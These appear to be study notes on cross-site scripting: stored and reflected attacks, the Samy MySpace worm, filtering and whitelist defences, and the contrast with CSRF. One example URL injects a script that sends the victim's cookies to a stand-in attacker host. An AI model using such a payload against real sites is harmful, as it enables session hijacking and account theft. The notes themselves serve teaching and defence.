# Cross-site Scripting (XSS)

A technique hackers use to get around the same-origin policy (SOP).
An attacker can construct a malicious script which can trick a user's browser into thinking the script came from a trusted origin. This works by lettings the trusted website send the malicious script to the user's browser. The browser will view the script as coming from the same origin, because it does.

## Stored (or "persistent") XSS attack

* Attacker leaves their script on the bank.com server
* Server sends script to browser
* Browser executes it with the same origin as the bank.com server.

__Key__: Server fails to ensure that the content uploaded to the page does not contain embedded scripts.

### Samy

The most notable example is the Samy worm on MySpace.  
Samy uploaded a malicious script onto it's own MySpace page. User who later visited Samy's page ran the program. This program made them send a friend request to Samy and display the same malicious message on their own profile. As a result making other people run the same script.  
In doing this, Samy made 1000000 friends in 20 hours & took MySpace down for a weekend.

## Reflected XSS attack

* User visits bad.com
* Bad.com sends malicious page to the user (url sends usr to bank.com but has some script attached to it)
* User follows the link to bank.org  
* Bank.com echoes the script back to you in its response
* Your browser executes the script in the response within the same origin as bank.org.

__Key__: Find instances where a web server will echo the user input back in to the HTML response.  
example:  

``` url
http://victim.com/search.php?term=<script> window.open('http://bad.com/steal?c=" + document.cookie) </script>
```

## XSS Defenses

### Filter/Escape

Typically, servers sanitizes the content provided by the user. (remove html tags)

__Problems__:

* The biggest problem is finding the malicious content. There are multiple ways to introduce js to a webpage (CSS tags, XML-encoded data)
* Browsers usually parse broken HTML tags. This can be exploited too. (Samy figured out IE permits JS tag to be split across multiple lines, this bypassed the MySpace filters and infected IE users)

### White list

Sites that do allow some tags can check if content only creates the tags that are whitelisted.

Another solution for sites that allow users to style is to use a language like markdown instead of html with tags.

## XSS vs CSRF

* XSS exploits the trust a client browser has in data sent from the legitimate website.
* CSRF exploits the trust the legitimate website has in data sent from the client's browser.

## Key Idea

Verify, then trust
